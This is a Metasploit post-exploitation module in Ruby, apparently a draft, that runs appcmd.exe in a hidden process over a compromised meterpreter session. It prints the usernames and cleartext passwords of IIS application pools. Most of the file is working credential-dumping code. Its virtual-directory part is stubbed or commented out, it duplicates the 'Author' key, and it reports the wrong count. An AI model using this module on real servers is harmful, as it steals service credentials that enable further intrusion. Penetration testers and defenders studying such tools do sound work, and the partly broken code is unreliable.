##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'


class Metasploit3 < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'IIS applicationHost.config Password Dumper',
        'Description'   => %q{ This script will decrypt and recover application pool and virtual directory passwords
         from the IIS applicationHost.config file on the system.},
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Scott Sutherland <scott.sutherland[at]netspi.com>'],
        'Author'        => [ 'Antti Rantasaari <antti.rantasaari[at]netspi.com>'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
  end

  def run
    # Create data table

    # Check if appcmd.exe exists
    print_status("Checking for appcmd.exe...")
    appcmd_status = client.fs.file.exists?("c:\\windows\\system32\\inetsrv\\appcmd.exe")
    if appcmd_status == false
      print_error("appcmd.exe was NOT found in its default location.")
      return
    else
      print_good("appcmd.exe was found in its default location.")
    end

    # Get list of application pools
    print_status("Checking for application pools...")
    cmd_get_pools = "c:\\windows\\system32\\inetsrv\\appcmd.exe list apppools /text:name"
    result_get_pools = run_cmd("#{cmd_get_pools}")
    parse_get_pools = result_get_pools.split("\n")
    if parse_get_pools.nil?
      print_error("No application pools found.")
    else
      print_good("Found #{parse_get_pools.length} application pools")

      # Get username and password for each pool
      parse_get_pools.each do | pool |        
        pool.strip!
        cmd_get_user = "c:\\windows\\system32\\inetsrv\\appcmd.exe list apppool \"#{pool}\" /text:processmodel.username"       
        result_get_user = run_cmd("#{cmd_get_user}")
        cmd_get_password = "c:\\windows\\system32\\inetsrv\\appcmd.exe list apppool \"#{pool}\" /text:processmodel.password"
        result_get_password = run_cmd("#{cmd_get_password}")

        #check if password was recovered
        print_status(" - #{pool}: user=#{result_get_user}password=#{result_get_password}")
      end  
    end

    # Get list of virtual directories
    print_status("Checking for virtual directories...")
    cmd_get_vdirs = "c:\\windows\\system32\\inetsrv\\appcmd.exe list vdir /text:vdir.name"
    result_get_vdirs = run_cmd("#{cmd_get_vdirs}")
    parse_get_vdirs = result_get_vdirs.split("\n")
    if parse_get_vdirs.nil?
      print_error("No application virtual directories found.")
    else
      print_good("Found #{parse_get_pools.length} virtual directories")

      # Get username and password for each virtual directory
      parse_get_vdirs.each do | vdir |    
        vdir.strip!    
        #cmd_get_user = "c:\\windows\\system32\\inetsrv\\appcmd.exe list vdir #{vdir} /text:userName"
        #cmd_get_password = "c:\\windows\\system32\\inetsrv\\appcmd.exe list vdir #{vdir} /text:password"
        print_status(" - #{vdir}")
        
        #check if password was recovered
      end  
    end

    # Check if any passwords were found

    # Display passwords

    # Store password in loot

  end

  # Methods
  def run_cmd(cmd,token=true)
    opts = {'Hidden' => true, 'Channelized' => true, 'UseThreadToken' => token}
    process = session.sys.process.execute(cmd, nil, opts)
    res = ""
    while (d = process.channel.read)
      break if d == ""
      res << d
    end
    process.channel.close
    process.close
    return res
  end



end
